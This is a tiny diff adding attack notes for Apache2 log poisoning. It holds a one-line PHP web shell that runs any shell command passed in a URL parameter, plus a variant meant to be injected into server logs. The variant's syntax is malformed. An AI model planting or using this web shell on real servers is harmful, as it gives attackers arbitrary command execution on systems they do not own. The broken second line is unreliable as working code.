@@ -1,0 +1,10 @@
+#log poisoning for apache2
+
+#actual code
+
+<?php echo shell_exec($_GET['cmd']); ?>
+
+#when injecting to server to poison log files
+
+<?php echo <'pre'> . shell_exec($_GET['cmd']) . </'pre'>; ?>
+
